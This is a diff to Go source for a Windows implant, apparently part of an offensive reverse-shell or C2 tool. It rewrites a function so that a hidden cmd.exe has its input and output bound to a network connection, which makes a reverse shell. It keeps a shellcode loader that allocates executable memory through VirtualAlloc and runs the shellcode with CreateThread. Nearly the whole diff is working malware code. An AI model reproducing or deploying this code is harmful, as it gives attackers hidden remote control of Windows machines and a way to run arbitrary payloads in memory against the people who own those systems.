@@ -6,7 +6,7 @@ import (
 	"encoding/base64"
 	"net"
 	"os/exec"
-	"syscall"
+	"golang.org/x/sys/windows"
 	"unsafe"
 )
 
@@ -16,21 +16,13 @@ const (
 )
 
 // GetShell pops an *exec.Cmd and return it to be used in a reverse shell
-func GetShell() *exec.Cmd {
+func GetShell(conn net.Conn) {
 	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
 	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	return cmd
-}
-
-// ExecuteCmd runs the provided command through cmd.exe
-// and redirects the result to the provided net.Conn object.
-func ExecuteCmd(command string, conn net.Conn) {
-	cmd_path := "C:\\Windows\\System32\\cmd.exe"
-	cmd := exec.Command(cmd_path, "/c", command+"\n")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	cmd.Stdout = conn
+	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
 	cmd.Stderr = conn
+	cmd.Stdin = conn
+	cmd.Stdout = conn
 	_ = cmd.Run()
 }
 
@@ -47,11 +39,11 @@ func InjectShellcode(encShellcode string) {
 // and executes it via a syscall.Syscall call.
 func ExecShellcode(shellcode []byte) {
 	// Resolve kernell32.dll, and VirtualAlloc
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	kernel32 := windows.MustLoadDLL("kernel32.dll")
 	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
 	procCreateThread := kernel32.MustFindProc("CreateThread")
 	// Reserve space to drop shellcode
-	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
+	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
 	// Ugly, but works
 	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
 	// Copy shellcode
